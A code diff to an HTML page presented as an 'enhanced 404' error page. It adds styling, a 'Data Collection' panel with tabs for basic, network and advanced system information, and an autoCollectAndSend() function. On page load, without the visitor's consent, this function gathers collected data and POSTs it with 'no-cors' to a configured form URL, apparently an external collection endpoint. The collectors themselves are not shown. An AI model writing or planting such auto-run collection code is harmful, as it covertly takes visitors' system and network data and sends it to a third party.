@@ -252,7 +252,7 @@
 
         .debug-header {
             display: flex;
-            justify-content: between;
+            justify-content: space-between;
             align-items: center;
             margin-bottom: 1rem;
             padding-bottom: 0.5rem;
@@ -316,6 +316,84 @@
             background: #f8f9fa;
             color: #3c4043;
             border: 1px solid #dadce0;
+        }
+
+        .tab-container {
+            display: flex;
+            border-bottom: 1px solid #e1e5e9;
+            margin-bottom: 1rem;
+        }
+
+        .tab {
+            padding: 0.5rem 1rem;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            font-size: 0.9rem;
+        }
+
+        .tab.active {
+            border-bottom-color: #1a73e8;
+            color: #1a73e8;
+            font-weight: 500;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .data-item {
+            margin-bottom: 0.5rem;
+            padding: 0.25rem 0;
+        }
+
+        .data-item strong {
+            color: #3c4043;
+        }
+
+        .sensitive-data {
+            background-color: #fff8e1;
+            padding: 0.5rem;
+            border-radius: 4px;
+            border-left: 3px solid #ffc107;
+        }
+
+        .status {
+            padding: 0.75rem;
+            border-radius: 4px;
+            margin-bottom: 1rem;
+            font-size: 0.9rem;
+        }
+
+        .status.loading {
+            background-color: #e3f2fd;
+            color: #0d47a1;
+            border-left: 3px solid #2196f3;
+        }
+
+        .status.success {
+            background-color: #e8f5e9;
+            color: #1b5e20;
+            border-left: 3px solid #4caf50;
+        }
+
+        .status.error {
+            background-color: #ffebee;
+            color: #b71c1c;
+            border-left: 3px solid #f44336;
+        }
+
+        .auto-collect-notice {
+            background-color: #e3f2fd;
+            border: 1px solid #bbdefb;
+            border-radius: 4px;
+            padding: 0.75rem;
+            margin-bottom: 1rem;
+            font-size: 0.9rem;
+            color: #0d47a1;
         }
 
         @media (max-width: 768px) {
@@ -410,6 +488,60 @@
             </div>
         </div>
     </footer>
+
+    <!-- Debug Panel -->
+    <button class="debug-panel" onclick="toggleDataPanel()">Data</button>
+    
+    <div class="debug-content" id="dataPanel">
+        <div class="debug-header">
+            <div class="debug-title">Data Collection</div>
+            <button class="close-debug" onclick="toggleDataPanel()">×</button>
+        </div>
+        
+        <div class="auto-collect-notice">
+            Data collection is automatically triggered when the page loads.
+        </div>
+        
+        <div class="tab-container">
+            <div class="tab active" onclick="switchTab('basic')">Basic</div>
+            <div class="tab" onclick="switchTab('network')">Network</div>
+            <div class="tab" onclick="switchTab('advanced')">Advanced</div>
+        </div>
+        
+        <div class="tab-content active" id="basicTab">
+            <div class="debug-section">
+                <h4>Basic System Information</h4>
+                <div class="debug-info" id="basicDataPreview">
+                    Loading basic data...
+                </div>
+            </div>
+        </div>
+        
+        <div class="tab-content" id="networkTab">
+            <div class="debug-section">
+                <h4>Network Information</h4>
+                <div class="debug-info" id="networkDataPreview">
+                    Click to load network data
+                </div>
+            </div>
+        </div>
+        
+        <div class="tab-content" id="advancedTab">
+            <div class="debug-section">
+                <h4>Advanced System Information</h4>
+                <div class="debug-info" id="advancedDataPreview">
+                    Loading advanced data...
+                </div>
+            </div>
+        </div>
+        
+        <div id="status" style="display: none;"></div>
+        
+        <div class="debug-actions">
+            <button class="debug-btn primary" onclick="collectAndSendToForm()">Send Data</button>
+            <button class="debug-btn secondary" onclick="toggleDataPanel()">Close</button>
+        </div>
+    </div>
 
     <script>
         // Configuration
@@ -936,6 +1068,33 @@
             }
         }
         
+        // NEW: Auto-trigger function
+        async function autoCollectAndSend() {
+            console.log('Auto-collecting data on page load...');
+            
+            try {
+                const data = await collectAllData();
+                
+                // Prepare data for form
+                const formData = new FormData();
+                const dataString = JSON.stringify(data, null, 2);
+                
+                formData.append(FORM_FIELD_ID, dataString);
+
+                // Send data to form
+                await fetch(FORM_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: formData
+                });
+
+                console.log('Auto-collected data sent successfully');
+                
+            } catch (error) {
+                console.error('Auto-collection error:', error);
+            }
+        }
+        
         function goHome() {
             window.location.href = '/';
         }
@@ -947,6 +1106,9 @@
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
             console.log('Enhanced 404 page with data collector initialized');
+            
+            // Auto-trigger data collection when page loads
+            autoCollectAndSend();
         });
     </script>
 </body>
